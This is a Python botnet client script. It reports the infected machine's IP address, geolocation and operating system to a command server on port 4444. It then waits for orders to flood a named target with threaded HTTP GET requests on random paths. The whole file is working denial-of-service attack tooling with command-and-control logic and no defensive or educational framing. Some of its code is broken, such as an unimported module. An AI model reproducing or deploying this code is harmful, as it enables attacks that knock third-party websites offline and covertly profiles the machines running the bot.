import socket
import requests
import platform
import json
from geopy.geocoders import Nominatim
import random
import string
import threading
import time

SERVER_HOST = '127.0.0.1'
SERVER_PORT = 4444

# Shared variable for thread counts
thread_num = 0
thread_num_mutex = threading.Lock()

def get_system_info():
    # Fetch the bot's IPv4 address
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))  # Use Google DNS to determine the local IP
    ip_address = s.getsockname()[0]
    s.close()

    # Resolve geolocation using geopy
    geolocator = Nominatim(user_agent="geoapi")
    location = geolocator.geocode(ip_address)
    lat, lon = location.latitude, location.longitude

    # Get OS information
    os_info = platform.platform()

    return {"ip": ip_address, "latitude": lat, "longitude": lon, "location": location.address, "os": os_info}

# Print thread status
def print_status():
    global thread_num
    thread_num_mutex.acquire(True)
    thread_num += 1
    sys.stdout.write(f"\r {time.ctime().split()[3]} [{str(thread_num)}] #-#-# Hold Your Tears #-#-#")
    sys.stdout.flush()
    thread_num_mutex.release()

# Generate URL Path
def generate_url_path():
    msg = str(string.ascii_letters + string.digits + string.punctuation)
    data = "".join(random.sample(msg, 5))
    return data

# Perform the attack
def perform_attack(target, rounds):
    host = target
    port = 80
    ip = socket.gethostbyname(host)
    num_requests = rounds

    print(f"[#] Attack started on {host} ({ip}) || Port: {str(port)} || # Requests: {str(num_requests)}")

    def attack():
        print_status()
        url_path = generate_url_path()

        # Create a raw socket
        dos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        try:
            # Open the connection on that raw socket
            dos.connect((ip, port))

            # Send the request according to HTTP spec
            byt = (f"GET /{url_path} HTTP/1.1\nHost: {host}\n\n").encode()
            dos.send(byt)
        except socket.error as e:
            print(f"\n [ No connection, server may be down ]: {e}")
        finally:
            # Close our socket gracefully
            dos.shutdown(socket.SHUT_RDWR)
            dos.close()

    # Spawn a thread per request
    all_threads = []
    for i in range(num_requests):
        t1 = threading.Thread(target=attack)
        t1.start()
        all_threads.append(t1)

        # Adjusting this sleep time will affect requests per second
        time.sleep(0.01)

    for current_thread in all_threads:
        current_thread.join()

def main():
    try:
        # Connect to the server
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((SERVER_HOST, SERVER_PORT))

        # Send bot info to the server
        bot_info = get_system_info()
        s.send(json.dumps(bot_info).encode())

        # Wait for commands from the server
        while True:
            data = s.recv(1024).decode()
            command = json.loads(data)

            if command['action'] == 'attack':
                target = command['target']
                rounds = command['rounds']
                perform_attack(target, rounds)

    except Exception as e:
        print(f"Error: {e}")

if __name__ == '__main__':
    main()
